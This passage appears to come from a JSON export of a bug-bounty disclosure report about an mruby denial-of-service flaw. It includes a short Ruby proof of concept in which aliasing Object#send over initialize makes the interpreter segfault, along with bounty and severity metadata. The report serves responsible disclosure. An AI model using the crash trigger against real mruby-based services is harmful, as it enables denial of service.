17-03-14T21:07:39.175Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"We can arrange for C to call `Object#send` by aliasing it over `initialize`. This will cause `Class#new` (a C function) to call `#initialize` (which is actually `Object#send`) with arbitrary arguments.\n\nIf we invoke a Ruby method through `Object#send`, mruby segfaults:\n\n```\ndef foo\nend\n\nclass X\n  alias_method :initialize, :send\nend\n\nX.new.send(:foo)\n```","vulnerability_information_html":"\u003cp\u003eWe can arrange for C to call \u003ccode\u003eObject#send\u003c/code\u003e by aliasing it over \u003ccode\u003einitialize\u003c/code\u003e. This will cause \u003ccode\u003eClass#new\u003c/code\u003e (a C function) to call \u003ccode\u003e#initialize\u003c/code\u003e (which is actually \u003ccode\u003eObject#send\u003c/code\u003e) with arbitrary arguments.\u003c/p\u003e\n\n\u003cp\u003eIf we invoke a Ruby method through \u003ccode\u003eObject#send\u003c/code\u003e, mruby segfaults:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003edef foo\nend\n\nclass X\n  alias_method :initialize, :send\nend\n\nX.new.send(:foo)\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","bounty_amount":"8000.0","formatted_bounty":"$8,000","weakness":{"id":48,"name":"Denial of Service"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2017-04-13T21:07:39.221Z","allow_singular_disclosure_after":-117099528.64435501,"singular_disclosure_allowed":true,"vote_count":13,"voters":["delimitry","mpz","eveeez","dz_samir","spetr0x","bughuntergr","b4155f7c29acd42c27d007a","vardhan","fathy","fytane","and 3 more..."],"severity":{"rating":"high","author_type":"Team"},"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":1307930,"is_internal":false,"editable"